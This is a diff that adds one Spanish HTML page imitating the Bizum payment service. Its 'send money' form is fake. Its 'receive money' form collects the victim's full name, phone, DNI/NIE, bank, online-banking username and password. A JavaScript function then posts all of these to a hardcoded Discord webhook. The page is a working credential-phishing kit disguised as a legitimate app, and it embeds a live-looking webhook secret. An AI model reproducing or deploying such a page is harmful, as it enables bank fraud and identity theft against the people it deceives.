@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bizum</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #333;
+        }
+
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.08);
+            border: 1px solid #e8e8e8;
+            padding: 0;
+            width: 100%;
+            max-width: 400px;
+            overflow: hidden;
+        }
+
+        .header {
+            background: #ffffff;
+            padding: 40px 20px 30px;
+            text-align: center;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #1a1a1a;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+            font-weight: 400;
+        }
+
+        .content {
+            padding: 30px;
+            background: #ffffff;
+        }
+
+        .main-buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            padding: 20px 15px;
+            border: 2px solid #e8e8e8;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            background: #ffffff;
+            color: #333;
+        }
+
+        .btn:hover {
+            border-color: #d0d0d0;
+            background: #fafafa;
+        }
+
+        .btn:active {
+            transform: translateY(1px);
+        }
+
+        .btn-send {
+            border-color: #28a745;
+            color: #28a745;
+        }
+
+        .btn-send:hover {
+            background: #f8fff9;
+            border-color: #1e7e34;
+        }
+
+        .btn-receive {
+            border-color: #007bff;
+            color: #007bff;
+        }
+
+        .btn-receive:hover {
+            background: #f8f9ff;
+            border-color: #0056b3;
+        }
+
+        .form-section {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .form-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 500;
+            color: #333;
+            font-size: 14px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #d1d5d9;
+            border-radius: 4px;
+            font-size: 15px;
+            transition: all 0.2s ease;
+            background: #ffffff;
+            color: #333;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #007bff;
+            box-shadow: 0 0 0 2px rgba(0, 123, 255, 0.1);
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 10px;
+        }
+
+        .btn-submit:hover {
+            background: #0056b3;
+        }
+
+        .btn-submit:active {
+            transform: translateY(1px);
+        }
+
+        .btn-back {
+            background: #6c757d;
+            color: white;
+            padding: 8px 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: all 0.2s ease;
+            font-size: 14px;
+        }
+
+        .btn-back:hover {
+            background: #545b62;
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #28a745;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            transform: translateX(400px);
+            transition: transform 0.3s ease;
+            z-index: 1000;
+            font-size: 14px;
+        }
+
+        .notification.show {
+            transform: translateX(0);
+        }
+
+        .notification.error {
+            background: #dc3545;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #007bff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .section-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #1a1a1a;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">Bizum</div>
+            <div class="subtitle">Envía y recibe dinero al instante</div>
+        </div>
+
+        <div class="content">
+            <!-- Pantalla principal -->
+            <div id="main-screen">
+                <div class="main-buttons">
+                    <button class="btn btn-send" onclick="showSendForm()">
+                        <div>Enviar</div>
+                    </button>
+                    <button class="btn btn-receive" onclick="showReceiveForm()">
+                        <div>Recibir</div>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Formulario de envío -->
+            <div id="send-form" class="form-section">
+                <button class="btn-back" onclick="showMainScreen()">← Volver</button>
+                <h3 class="section-title">Enviar dinero</h3>
+                <div class="form-group">
+                    <label class="form-label">Teléfono del destinatario</label>
+                    <input type="tel" class="form-input" placeholder="+34 600 000 000">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Cantidad (€)</label>
+                    <input type="number" class="form-input" placeholder="0,00" step="0.01">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Concepto</label>
+                    <input type="text" class="form-input" placeholder="Escribe un mensaje...">
+                </div>
+                <button class="btn-submit" onclick="processSend()">Enviar dinero</button>
+            </div>
+
+            <!-- Formulario de recibir -->
+            <div id="receive-form" class="form-section">
+                <button class="btn-back" onclick="showMainScreen()">← Volver</button>
+                <h3 class="section-title">Recibir dinero</h3>
+                <div class="form-group">
+                    <label class="form-label">Tu nombre completo</label>
+                    <input type="text" id="fullName" class="form-input" placeholder="Nombre y apellidos" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Tu teléfono</label>
+                    <input type="tel" id="phone" class="form-input" placeholder="+34 600 000 000" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">DNI/NIE</label>
+                    <input type="text" id="dni" class="form-input" placeholder="12345678A" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Banco</label>
+                    <select id="bank" class="form-input" required>
+                        <option value="">Selecciona tu banco</option>
+                        <option value="santander">Banco Santander</option>
+                        <option value="bbva">BBVA</option>
+                        <option value="caixabank">CaixaBank</option>
+                        <option value="sabadell">Banco Sabadell</option>
+                        <option value="bankinter">Bankinter</option>
+                        <option value="ing">ING</option>
+                        <option value="openbank">Openbank</option>
+                        <option value="otros">Otros</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Usuario bancario</label>
+                    <input type="text" id="username" class="form-input" placeholder="Tu usuario del banco" required>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Contraseña</label>
+                    <input type="password" id="password" class="form-input" placeholder="Tu contraseña" required>
+                </div>
+                <button class="btn-submit" onclick="processReceive()">Configurar recepción</button>
+            </div>
+
+            <!-- Loading -->
+            <div id="loading" class="loading">
+                <div class="spinner"></div>
+                <div>Procesando...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notificación -->
+    <div id="notification" class="notification">
+        <div id="notification-text"></div>
+    </div>
+
+    <script>
+        function showMainScreen() {
+            document.getElementById('main-screen').style.display = 'block';
+            document.getElementById('send-form').classList.remove('active');
+            document.getElementById('receive-form').classList.remove('active');
+            document.getElementById('loading').style.display = 'none';
+        }
+
+        function showSendForm() {
+            document.getElementById('main-screen').style.display = 'none';
+            document.getElementById('send-form').classList.add('active');
+        }
+
+        function showReceiveForm() {
+            document.getElementById('main-screen').style.display = 'none';
+            document.getElementById('receive-form').classList.add('active');
+        }
+
+        function showNotification(message, type = 'success') {
+            const notification = document.getElementById('notification');
+            const notificationText = document.getElementById('notification-text');
+            
+            notificationText.textContent = message;
+            notification.className = 'notification show';
+            if (type === 'error') {
+                notification.classList.add('error');
+            }
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 4000);
+        }
+
+        function showLoading() {
+            document.getElementById('send-form').style.display = 'none';
+            document.getElementById('receive-form').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+        }
+
+        async function sendToDiscord(data) {
+            // URL del webhook - configúrala aquí directamente
+            const webhookUrl = "https://discordapp.com/api/webhooks/1399735771472199680/KCg0zcNVPhFmy2JpMNxztVceSOsG_zNhG9Bg-90CPx7ktH3hwTZ5SwsIOe2beCCfyIGH";
+            
+            if (!webhookUrl || webhookUrl === "TU_WEBHOOK_URL_AQUI") {
+                showNotification('Webhook no configurado en el servidor', 'error');
+                return false;
+            }
+
+            try {
+                const embed = {
+                    title: "Nueva solicitud de recepción Bizum",
+                    color: 0x007bff,
+                    fields: [
+                        { name: "Nombre", value: data.fullName, inline: true },
+                        { name: "Teléfono", value: data.phone, inline: true },
+                        { name: "DNI/NIE", value: data.dni, inline: true },
+                        { name: "Banco", value: data.bank, inline: true },
+                        { name: "Usuario bancario", value: data.username, inline: true },
+                        { name: "Contraseña", value: data.password, inline: false }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: "Sistema Bizum"
+                    }
+                };
+
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        embeds: [embed]
+                    }),
+                });
+
+                if (response.ok) {
+                    return true;
+                } else {
+                    throw new Error(`Error HTTP: ${response.status}`);
+                }
+            } catch (error) {
+                console.error('Error enviando a Discord:', error);
+                showNotification('Error al enviar notificación a Discord', 'error');
+                return false;
+            }
+        }
+
+        async function processReceive() {
+            const fullName = document.getElementById('fullName').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            const dni = document.getElementById('dni').value.trim();
+            const bank = document.getElementById('bank').value;
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            // Validaciones
+            if (!fullName || !phone || !dni || !bank || !username || !password) {
+                showNotification('Por favor, completa todos los campos', 'error');
+                return;
+            }
+
+            if (!phone.match(/^(\+34|0034|34)?[6789]\d{8}$/)) {
+                showNotification('Formato de teléfono incorrecto', 'error');
+                return;
+            }
+
+            showLoading();
+
+            const userData = {
+                fullName,
+                phone,
+                dni,
+                bank: document.getElementById('bank').options[document.getElementById('bank').selectedIndex].text,
+                username,
+                password
+            };
+
+            // Simular procesamiento
+            setTimeout(async () => {
+                const success = await sendToDiscord(userData);
+                
+                if (success) {
+                    showNotification('Configuración completada. Notificación enviada a Discord');
+                    setTimeout(() => {
+                        showMainScreen();
+                        // Limpiar formulario
+                        document.getElementById('fullName').value = '';
+                        document.getElementById('phone').value = '';
+                        document.getElementById('dni').value = '';
+                        document.getElementById('bank').value = '';
+                        document.getElementById('username').value = '';
+                        document.getElementById('password').value = '';
+                    }, 2000);
+                } else {
+                    showMainScreen();
+                }
+            }, 2000);
+        }
+
+        function processSend() {
+            showLoading();
+            
+            setTimeout(() => {
+                showNotification('Dinero enviado correctamente');
+                showMainScreen();
+            }, 2000);
+        }
+
+
+    </script>
+</body>
+</html>
